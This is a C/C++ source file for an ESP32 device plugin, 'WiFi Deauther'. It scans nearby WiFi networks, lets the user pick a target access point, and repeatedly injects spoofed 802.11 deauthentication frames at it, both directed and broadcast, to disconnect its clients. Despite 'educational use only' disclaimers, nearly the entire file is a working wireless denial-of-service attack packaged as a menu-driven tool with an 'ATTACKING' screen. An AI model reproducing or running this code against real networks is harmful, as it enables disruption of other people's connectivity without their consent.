/*
 * WiFi Deauther Plugin
 * Educational WiFi deauthentication tool for authorized security testing
 * 
 * WARNING: This tool is for educational and authorized testing purposes only.
 * Unauthorized use may violate local laws. Use responsibly and ethically.
 */

#include "plugin_api.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_err.h>

// Deauth frame template
static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00,                         // Frame Control
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source address (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0x07, 0x00                          // Reason code (Class 3 frame received from nonassociated station)
};

// Plugin state
typedef struct {
    bool scanning;
    bool attacking;
    int selected_ap;
    int ap_count;
    uint32_t packets_sent;
    uint32_t last_update;
    uint32_t attack_start_time;
    uint8_t current_channel;
    
    // AP list
    struct {
        char ssid[33];
        uint8_t bssid[6];
        int32_t rssi;
        uint8_t channel;
        wifi_auth_mode_t authmode;
        bool selected;
    } ap_list[20];
    
    // UI state
    enum {
        STATE_MENU,
        STATE_SCANNING,
        STATE_AP_LIST,
        STATE_ATTACKING,
        STATE_SETTINGS
    } ui_state;
    
    // Settings
    uint16_t attack_interval_ms;
    uint8_t attack_channel;
    bool broadcast_attack;
    bool targeted_attack;
    
} wifi_deauther_state_t;

// Function prototypes
static bool wifi_deauther_init(plugin_context_t* ctx);
static void wifi_deauther_run(plugin_context_t* ctx);
static void wifi_deauther_cleanup(plugin_context_t* ctx);
static bool wifi_deauther_event_handler(plugin_context_t* ctx, uint32_t event, void* data);

// Internal functions
static void start_wifi_scan(wifi_deauther_state_t* state);
static void process_scan_results(wifi_deauther_state_t* state);
static void start_deauth_attack(wifi_deauther_state_t* state);
static void stop_deauth_attack(wifi_deauther_state_t* state);
static void send_deauth_frame(const uint8_t* bssid, uint8_t channel);
static void draw_menu(wifi_deauther_state_t* state, const plugin_hal_t* hal);
static void draw_ap_list(wifi_deauther_state_t* state, const plugin_hal_t* hal);
static void draw_attack_screen(wifi_deauther_state_t* state, const plugin_hal_t* hal);
static void draw_settings(wifi_deauther_state_t* state, const plugin_hal_t* hal);

// Plugin manifest
static plugin_manifest_t wifi_deauther_manifest = PLUGIN_MANIFEST(
    "WiFi Deauther",
    "1.0.0",
    "Izod Mini Team",
    PLUGIN_CATEGORY_PENTEST,
    wifi_deauther_init,
    wifi_deauther_run,
    wifi_deauther_cleanup
);

// Plugin initialization
static bool wifi_deauther_init(plugin_context_t* ctx) {
    if (!ctx) return false;
    
    // Allocate plugin state
    wifi_deauther_state_t* state = (wifi_deauther_state_t*)malloc(sizeof(wifi_deauther_state_t));
    if (!state) return false;
    
    // Initialize state
    memset(state, 0, sizeof(wifi_deauther_state_t));
    state->ui_state = STATE_MENU;
    state->selected_ap = 0;
    state->attack_interval_ms = 100; // 100ms between deauth frames
    state->attack_channel = 1;
    state->broadcast_attack = true;
    state->targeted_attack = false;
    
    ctx->private_data = state;
    ctx->private_data_size = sizeof(wifi_deauther_state_t);
    
    // Initialize WiFi in promiscuous mode
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    
    const plugin_hal_t* hal = plugin_get_hal();
    if (hal && hal->system) {
        hal->system->log("INFO", "WiFi Deauther initialized");
        hal->system->log("WARN", "Educational use only - Use responsibly!");
    }
    
    return true;
}

// Plugin main loop
static void wifi_deauther_run(plugin_context_t* ctx) {
    if (!ctx || !ctx->private_data) return;
    
    wifi_deauther_state_t* state = (wifi_deauther_state_t*)ctx->private_data;
    const plugin_hal_t* hal = plugin_get_hal();
    if (!hal) return;
    
    uint32_t now = hal->system->get_time_ms();
    
    // Handle scanning
    if (state->scanning && (now - state->last_update > 3000)) {
        process_scan_results(state);
        state->scanning = false;
        state->ui_state = STATE_AP_LIST;
    }
    
    // Handle deauth attack
    if (state->attacking && (now - state->last_update > state->attack_interval_ms)) {
        if (state->selected_ap < state->ap_count) {
            send_deauth_frame(state->ap_list[state->selected_ap].bssid, 
                            state->ap_list[state->selected_ap].channel);
            state->packets_sent++;
        }
        state->last_update = now;
    }
    
    // Update display every 100ms
    static uint32_t last_display_update = 0;
    if (now - last_display_update > 100) {
        hal->display->clear(PLUGIN_COLOR_BLACK);
        
        switch (state->ui_state) {
            case STATE_MENU:
                draw_menu(state, hal);
                break;
            case STATE_SCANNING:
                hal->display->text(10, 10, "WiFi Deauther", PLUGIN_COLOR_WHITE, 2);
                hal->display->text(10, 40, "Scanning networks...", PLUGIN_COLOR_YELLOW, 1);
                
                // Animated scanning indicator
                int dots = (now / 500) % 4;
                for (int i = 0; i < dots; i++) {
                    hal->display->text(180 + i * 10, 40, ".", PLUGIN_COLOR_YELLOW, 1);
                }
                break;
            case STATE_AP_LIST:
                draw_ap_list(state, hal);
                break;
            case STATE_ATTACKING:
                draw_attack_screen(state, hal);
                break;
            case STATE_SETTINGS:
                draw_settings(state, hal);
                break;
        }
        
        // Warning footer
        hal->display->text(10, 300, "Educational use only!", PLUGIN_COLOR_RED, 1);
        
        hal->display->update();
        last_display_update = now;
    }
    
    hal->system->delay_ms(10);
}

// Plugin cleanup
static void wifi_deauther_cleanup(plugin_context_t* ctx) {
    if (!ctx || !ctx->private_data) return;
    
    wifi_deauther_state_t* state = (wifi_deauther_state_t*)ctx->private_data;
    
    // Stop any ongoing attacks
    stop_deauth_attack(state);
    
    // Restore normal WiFi mode
    WiFi.mode(WIFI_MODE_STA);
    
    const plugin_hal_t* hal = plugin_get_hal();
    if (hal && hal->system) {
        hal->system->log("INFO", "WiFi Deauther cleanup");
    }
    
    free(ctx->private_data);
    ctx->private_data = nullptr;
    ctx->private_data_size = 0;
}

// Plugin event handler
static bool wifi_deauther_event_handler(plugin_context_t* ctx, uint32_t event, void* data) {
    if (!ctx || !ctx->private_data) return false;
    
    wifi_deauther_state_t* state = (wifi_deauther_state_t*)ctx->private_data;
    const plugin_hal_t* hal = plugin_get_hal();
    
    if (event == PLUGIN_EVENT_BUTTON_PRESS) {
        plugin_button_event_t* btn_event = (plugin_button_event_t*)data;
        if (!btn_event) return false;
        
        switch (btn_event->button_id) {
            case PLUGIN_BUTTON_MENU:
                // Exit plugin
                return false;
                
            case PLUGIN_BUTTON_SELECT:
                switch (state->ui_state) {
                    case STATE_MENU:
                        if (state->selected_ap == 0) {
                            // Start scan
                            start_wifi_scan(state);
                        } else if (state->selected_ap == 1) {
                            // Settings
                            state->ui_state = STATE_SETTINGS;
                            state->selected_ap = 0;
                        }
                        break;
                        
                    case STATE_AP_LIST:
                        if (state->ap_count > 0) {
                            // Start attack on selected AP
                            start_deauth_attack(state);
                        }
                        break;
                        
                    case STATE_ATTACKING:
                        // Stop attack
                        stop_deauth_attack(state);
                        state->ui_state = STATE_AP_LIST;
                        break;
                        
                    case STATE_SETTINGS:
                        // Toggle setting
                        break;
                }
                break;
                
            case PLUGIN_BUTTON_PREVIOUS:
                if (state->ui_state == STATE_AP_LIST && state->ap_count > 0) {
                    state->selected_ap = (state->selected_ap - 1 + state->ap_count) % state->ap_count;
                } else if (state->ui_state == STATE_MENU) {
                    state->selected_ap = (state->selected_ap - 1 + 2) % 2;
                } else if (state->ui_state == STATE_SETTINGS) {
                    state->selected_ap = (state->selected_ap - 1 + 3) % 3;
                }
                break;
                
            case PLUGIN_BUTTON_NEXT:
                if (state->ui_state == STATE_AP_LIST && state->ap_count > 0) {
                    state->selected_ap = (state->selected_ap + 1) % state->ap_count;
                } else if (state->ui_state == STATE_MENU) {
                    state->selected_ap = (state->selected_ap + 1) % 2;
                } else if (state->ui_state == STATE_SETTINGS) {
                    state->selected_ap = (state->selected_ap + 1) % 3;
                }
                break;
                
            case PLUGIN_BUTTON_PLAY:
                if (state->ui_state == STATE_AP_LIST) {
                    state->ui_state = STATE_MENU;
                    state->selected_ap = 0;
                } else if (state->ui_state == STATE_SETTINGS) {
                    state->ui_state = STATE_MENU;
                    state->selected_ap = 0;
                }
                break;
        }
        
        return true;
    }
    
    return false;
}

// Internal functions
static void start_wifi_scan(wifi_deauther_state_t* state) {
    state->scanning = true;
    state->ui_state = STATE_SCANNING;
    state->ap_count = 0;
    state->last_update = millis();
    
    WiFi.scanNetworks(true); // Async scan
}

static void process_scan_results(wifi_deauther_state_t* state) {
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_FAILED) {
        state->ap_count = 0;
        return;
    }
    
    state->ap_count = min(n, 20); // Limit to 20 APs
    
    for (int i = 0; i < state->ap_count; i++) {
        strncpy(state->ap_list[i].ssid, WiFi.SSID(i).c_str(), 32);
        state->ap_list[i].ssid[32] = '\0';
        
        // Get BSSID
        uint8_t* bssid = WiFi.BSSID(i);
        if (bssid) {
            memcpy(state->ap_list[i].bssid, bssid, 6);
        }
        
        state->ap_list[i].rssi = WiFi.RSSI(i);
        state->ap_list[i].channel = WiFi.channel(i);
        state->ap_list[i].authmode = WiFi.encryptionType(i);
        state->ap_list[i].selected = false;
    }
    
    WiFi.scanDelete();
    state->selected_ap = 0;
}

static void start_deauth_attack(wifi_deauther_state_t* state) {
    if (state->selected_ap >= state->ap_count) return;
    
    state->attacking = true;
    state->ui_state = STATE_ATTACKING;
    state->packets_sent = 0;
    state->attack_start_time = millis();
    state->last_update = millis();
    
    // Set WiFi channel
    esp_wifi_set_channel(state->ap_list[state->selected_ap].channel, WIFI_SECOND_CHAN_NONE);
    
    // Enable promiscuous mode for packet injection
    esp_wifi_set_promiscuous(true);
}

static void stop_deauth_attack(wifi_deauther_state_t* state) {
    state->attacking = false;
    esp_wifi_set_promiscuous(false);
}

static void send_deauth_frame(const uint8_t* bssid, uint8_t channel) {
    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
    
    // Set BSSID and source address
    memcpy(&deauth_frame[10], bssid, 6); // Source address (AP)
    memcpy(&deauth_frame[16], bssid, 6); // BSSID
    
    // Send deauth frame
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    
    // Also send with broadcast destination for broader effect
    memset(&deauth_frame[4], 0xFF, 6); // Broadcast destination
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
}

static void draw_menu(wifi_deauther_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "WiFi Deauther", PLUGIN_COLOR_WHITE, 2);
    
    // Menu options
    const char* menu_items[] = {"Scan Networks", "Settings"};
    
    for (int i = 0; i < 2; i++) {
        uint16_t color = (i == state->selected_ap) ? PLUGIN_COLOR_GREEN : PLUGIN_COLOR_WHITE;
        hal->display->text(20, 50 + i * 20, menu_items[i], color, 1);
        
        if (i == state->selected_ap) {
            hal->display->text(10, 50 + i * 20, ">", PLUGIN_COLOR_GREEN, 1);
        }
    }
    
    // Instructions
    hal->display->text(10, 120, "Select: Choose option", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 140, "Up/Down: Navigate", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 160, "Menu: Exit", PLUGIN_COLOR_GRAY, 1);
}

static void draw_ap_list(wifi_deauther_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "Select Target AP", PLUGIN_COLOR_WHITE, 2);
    
    if (state->ap_count == 0) {
        hal->display->text(10, 50, "No networks found", PLUGIN_COLOR_RED, 1);
        hal->display->text(10, 70, "Press Play to go back", PLUGIN_COLOR_GRAY, 1);
        return;
    }
    
    // Show AP list (max 8 visible)
    int start_idx = max(0, state->selected_ap - 4);
    int end_idx = min(state->ap_count, start_idx + 8);
    
    for (int i = start_idx; i < end_idx; i++) {
        int y = 40 + (i - start_idx) * 20;
        uint16_t color = (i == state->selected_ap) ? PLUGIN_COLOR_GREEN : PLUGIN_COLOR_WHITE;
        
        if (i == state->selected_ap) {
            hal->display->text(5, y, ">", PLUGIN_COLOR_GREEN, 1);
        }
        
        // SSID
        char display_ssid[20];
        strncpy(display_ssid, state->ap_list[i].ssid, 19);
        display_ssid[19] = '\0';
        hal->display->text(15, y, display_ssid, color, 1);
        
        // RSSI and channel
        char info[20];
        snprintf(info, sizeof(info), "Ch%d %ddBm", state->ap_list[i].channel, state->ap_list[i].rssi);
        hal->display->text(150, y, info, color, 1);
        
        // Security indicator
        if (state->ap_list[i].authmode != WIFI_AUTH_OPEN) {
            hal->display->text(220, y, "🔒", color, 1);
        }
    }
    
    // Instructions
    hal->display->text(10, 220, "Select: Attack", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 240, "Up/Down: Navigate", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 260, "Play: Back", PLUGIN_COLOR_GRAY, 1);
}

static void draw_attack_screen(wifi_deauther_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "ATTACKING", PLUGIN_COLOR_RED, 2);
    
    if (state->selected_ap < state->ap_count) {
        // Target info
        hal->display->text(10, 40, "Target:", PLUGIN_COLOR_WHITE, 1);
        hal->display->text(60, 40, state->ap_list[state->selected_ap].ssid, PLUGIN_COLOR_YELLOW, 1);
        
        char channel_info[20];
        snprintf(channel_info, sizeof(channel_info), "Channel: %d", state->ap_list[state->selected_ap].channel);
        hal->display->text(10, 60, channel_info, PLUGIN_COLOR_WHITE, 1);
    }
    
    // Attack stats
    char packets_info[30];
    snprintf(packets_info, sizeof(packets_info), "Packets sent: %lu", state->packets_sent);
    hal->display->text(10, 90, packets_info, PLUGIN_COLOR_GREEN, 1);
    
    uint32_t elapsed = (millis() - state->attack_start_time) / 1000;
    char time_info[20];
    snprintf(time_info, sizeof(time_info), "Time: %lu:%02lu", elapsed / 60, elapsed % 60);
    hal->display->text(10, 110, time_info, PLUGIN_COLOR_GREEN, 1);
    
    // Attack rate
    if (elapsed > 0) {
        float rate = (float)state->packets_sent / elapsed;
        char rate_info[20];
        snprintf(rate_info, sizeof(rate_info), "Rate: %.1f pps", rate);
        hal->display->text(10, 130, rate_info, PLUGIN_COLOR_GREEN, 1);
    }
    
    // Visual indicator
    if (state->attacking) {
        int blink = (millis() / 200) % 2;
        if (blink) {
            hal->display->fill_circle(200, 100, 10, PLUGIN_COLOR_RED);
        }
        hal->display->text(180, 120, "ACTIVE", PLUGIN_COLOR_RED, 1);
    }
    
    // Instructions
    hal->display->text(10, 200, "Select: Stop attack", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 220, "Menu: Exit", PLUGIN_COLOR_GRAY, 1);
}

static void draw_settings(wifi_deauther_state_t* state, const plugin_hal_t* hal) {
    hal->display->text(10, 10, "Settings", PLUGIN_COLOR_WHITE, 2);
    
    const char* settings[] = {
        "Attack Interval",
        "Broadcast Attack",
        "Targeted Attack"
    };
    
    for (int i = 0; i < 3; i++) {
        uint16_t color = (i == state->selected_ap) ? PLUGIN_COLOR_GREEN : PLUGIN_COLOR_WHITE;
        hal->display->text(20, 50 + i * 25, settings[i], color, 1);
        
        if (i == state->selected_ap) {
            hal->display->text(10, 50 + i * 25, ">", PLUGIN_COLOR_GREEN, 1);
        }
        
        // Setting values
        char value[20];
        switch (i) {
            case 0:
                snprintf(value, sizeof(value), "%d ms", state->attack_interval_ms);
                break;
            case 1:
                strcpy(value, state->broadcast_attack ? "ON" : "OFF");
                break;
            case 2:
                strcpy(value, state->targeted_attack ? "ON" : "OFF");
                break;
        }
        hal->display->text(150, 50 + i * 25, value, color, 1);
    }
    
    hal->display->text(10, 200, "Select: Toggle", PLUGIN_COLOR_GRAY, 1);
    hal->display->text(10, 220, "Play: Back", PLUGIN_COLOR_GRAY, 1);
}

// Plugin entry point
extern "C" {
    const plugin_manifest_t* plugin_get_manifest(void) {
        wifi_deauther_manifest.event_handler = wifi_deauther_event_handler;
        wifi_deauther_manifest.compatibility_flags = PLUGIN_COMPAT_TFT_DISPLAY | PLUGIN_COMPAT_PHYSICAL_BTNS | PLUGIN_COMPAT_WIFI;
        wifi_deauther_manifest.memory_required = 16384;
        
        strncpy((char*)wifi_deauther_manifest.description,
                "WiFi deauthentication tool for authorized security testing only",
                PLUGIN_DESC_MAX_LENGTH - 1);
        
        return &wifi_deauther_manifest;
    }
}

